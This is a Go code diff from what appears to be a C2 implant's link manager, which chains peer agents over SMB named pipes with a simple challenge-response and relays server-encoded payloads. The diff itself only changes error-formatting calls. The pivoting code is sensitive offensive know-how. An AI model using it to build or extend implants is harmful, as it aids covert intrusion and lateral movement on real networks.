@@ -184,20 +184,20 @@ func (lm *RMgr) link(pipePath string) (string, error) {
 	// Check if already linked to this pipe
 	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
 		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
-			return "", fmt.Errorf(Err(E5))
+			return "", fmt.Errorf("%s", Err(E5))
 		}
 	}
 
 	// Connect to the named pipe
 	conn, err := connectToPipe(pipePath)
 	if err != nil {
-		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
 	}
 
 	// Perform lightweight authentication with the SMB agent
 	if err := performLinkAuth(conn); err != nil {
 		conn.Close()
-		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
 	}
 
 	// Generate routing ID
@@ -231,7 +231,7 @@ func (lm *RMgr) unlink(routingID string) error {
 
 	link, exists := lm.links[routingID]
 	if !exists {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	// Send graceful disconnect message
@@ -291,14 +291,14 @@ func (lm *RMgr) getActiveLinks() []*RPeer {
 func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string, transformed bool) error {
 	link, exists := lm.getLink(routingID)
 	if !exists {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	link.mu.Lock()
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	var data []byte
@@ -308,7 +308,7 @@ func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string, transform
 		// Payload has transforms applied by server - decode and send raw bytes
 		data, err = base64.StdEncoding.DecodeString(payload)
 		if err != nil {
-			return fmt.Errorf(ErrCtx(E18, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 		}
 	} else {
 		// Legacy mode - wrap payload in JSON envelope
@@ -318,7 +318,7 @@ func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string, transform
 
 		data, err = json.Marshal(message)
 		if err != nil {
-			return fmt.Errorf(ErrCtx(E18, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 		}
 	}
 
@@ -327,7 +327,7 @@ func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string, transform
 	if err := writeMessage(link.Conn, data); err != nil {
 		link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline
 		link.IsActive = false
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 	link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline
 
@@ -385,7 +385,7 @@ func (lm *RMgr) waitForLinkData(routingID string, timeout time.Duration) (*ROut,
 	case response := <-respChan:
 		return response, nil
 	case <-time.After(timeout):
-		return nil, fmt.Errorf(Err(E9))
+		return nil, fmt.Errorf("%s", Err(E9))
 	}
 }
 
@@ -571,7 +571,7 @@ func connectToPipe(pipePath string) (net.Conn, error) {
 		time.Sleep(100 * time.Millisecond)
 	}
 
-	return nil, fmt.Errorf(Err(E9))
+	return nil, fmt.Errorf("%s", Err(E9))
 }
 
 func performLinkAuth(conn net.Conn) error {
@@ -587,7 +587,7 @@ func performLinkAuth(conn net.Conn) error {
 	// Read challenge
 	challenge, err := readMessage(conn)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E10, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
 	}
 
 	// Simple challenge-response for now
@@ -595,17 +595,17 @@ func performLinkAuth(conn net.Conn) error {
 	response := append([]byte(lmAuthPrefix()), challenge...)
 
 	if err := writeMessage(conn, response); err != nil {
-		return fmt.Errorf(ErrCtx(E11, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 
 	// Read confirmation
 	confirm, err := readMessage(conn)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E10, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
 	}
 
 	if string(confirm) != lmAuthOK() {
-		return fmt.Errorf(Err(E3))
+		return fmt.Errorf("%s", Err(E3))
 	}
 
 	return nil
@@ -651,7 +651,7 @@ func readMessage(conn net.Conn) ([]byte, error) {
 
 	// Sanity check
 	if length > 10*1024*1024 { // 10MB max
-		return nil, fmt.Errorf(Err(E2))
+		return nil, fmt.Errorf("%s", Err(E2))
 	}
 
 	// Read data
